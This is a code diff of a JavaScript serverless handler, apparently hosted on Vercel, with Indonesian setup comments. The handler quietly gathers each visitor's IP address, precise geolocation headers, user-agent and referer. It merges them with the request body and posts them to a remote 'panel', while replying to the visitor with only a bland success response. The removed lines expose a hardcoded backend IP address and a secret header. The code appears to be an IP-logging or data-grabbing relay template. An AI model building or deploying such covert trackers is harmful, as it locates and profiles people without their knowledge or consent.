@@ -1,6 +1,5 @@
-// ===== GANTI 3 BARIS INI =====
-const BACKEND_URL = "http://157.15.40.44:3530";
-const BACKEND_SECRET = "SECRET_RAHASIA_LU";
+// ===== GANTI 1 BARIS INI =====
+const BACKEND_URL = "http://IP_PANEL:PORT";
 // ============================
 
 export default async function handler(req, res) {
@@ -19,47 +18,37 @@ export default async function handler(req, res) {
     const lat = req.headers["x-vercel-ip-latitude"] || "-";
     const lon = req.headers["x-vercel-ip-longitude"] || "-";
     const timezone = req.headers["x-vercel-ip-timezone"] || "-";
-    const postalCode = req.headers["x-vercel-ip-postal-code"] || "-";
 
     const ua = req.headers["user-agent"] || "-";
     const acceptLang = req.headers["accept-language"] || "-";
     const referer = req.headers["referer"] || "-";
-    const origin = req.headers["origin"] || "-";
 
     const body = req.body || {};
 
     const enriched = Object.assign({}, body, {
       server: {
         ip,
-        geo: { country, region: countryRegion, city, lat, lon, timezone, postalCode },
-        headers: { ua, acceptLang, referer, origin },
+        geo: { country, region: countryRegion, city, lat, lon, timezone },
+        headers: { ua, acceptLang, referer },
         receivedAt: new Date().toISOString(),
-        vercelRegion: process.env.VERCEL_REGION || "-",
-        vercelUrl: process.env.VERCEL_URL || "-"
+        vercelRegion: process.env.VERCEL_REGION || "-"
       }
     });
 
-    let backendData = { ok: true, weather: null };
-
     try {
-      const r = await fetch(`${BACKEND_URL}/api/send`, {
+      await fetch(`${BACKEND_URL}/api/send`, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "X-Secret": BACKEND_SECRET,
-          "X-Forwarded-From": "vercel"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(enriched)
       });
-      backendData = await r.json();
     } catch (e) {
       console.error("[Vercel] Panel unreachable:", e.message);
     }
 
-    return res.status(200).json({ ok: true, weather: backendData.weather || null });
+    return res.status(200).json({ ok: true });
 
   } catch (err) {
     console.error("[Vercel] Error:", err.message);
-    return res.status(200).json({ ok: true, weather: null });
+    return res.status(200).json({ ok: true });
   }
 }
